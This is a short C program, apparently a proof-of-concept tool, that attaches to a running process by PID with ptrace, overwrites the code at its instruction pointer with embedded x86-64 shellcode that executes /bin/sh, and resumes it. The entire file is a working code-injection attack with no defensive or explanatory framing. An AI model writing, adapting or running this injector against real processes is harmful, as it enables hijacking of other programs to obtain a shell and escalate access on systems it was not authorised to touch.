#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
const char *SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96"
                        "\x91\xd0\x8c\x97\xff\x48\xf7"
                        "\xdb\x53\x54\x5f\x99\x52\x57"
                        "\x54\x5e\xb0\x3b\x0f\x05";


void inject_code(uint64_t *payload, pid_t pid, unsigned long *dest){
        for(size_t i = 0; i < strlen(SHELLCODE); i+= 8, payload++, dest++){
                if (ptrace(PTRACE_POKETEXT, pid, dest, *payload) < 0){
                        perror("POKTEXT");
                        _exit(-1);
                }
        } 
}

int main(int argc, char **argv){
        pid_t pid;

        if (argc < 2){
                fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
                _exit(-1);
        }

        pid = atol(argv[1]);

        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0){
                perror("PTRACE_ATTACH");
                _exit(-1);
        }

        waitpid(pid, NULL, 0);
        fprintf(stdout, "* Process attached\n");

        struct user_regs_struct regs;

        fprintf(stdout, "* Getting registers\n");
        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0){
                perror("PTRACE_GETREGS");
                _exit(-1);
        }

        fprintf(stdout, "(rip) %p\n", regs.rip);
        fprintf(stdout, "*injecting shellcode\n");

        uint64_t *payload = (uint64_t *)SHELLCODE;
        inject_code(payload, pid, (unsigned long *) regs.rip);

        struct user_regs_struct new_regs;

        memcpy(&new_regs, &regs, sizeof(struct user_regs_struct));
        new_regs.rip += 2;

        if(ptrace(PTRACE_SETREGS, pid, NULL, &new_regs) < 0){
                perror("PTRACE_SETREGS");
                _exit(-1);
        }

        if(ptrace(PTRACE_CONT, pid, NULL, NULL) < 0){
                perror("PTRACE_DETACH");
                _exit(-1);
        }

        fprintf(stdout, "* successfully injected code into the process");

        return 0;
}
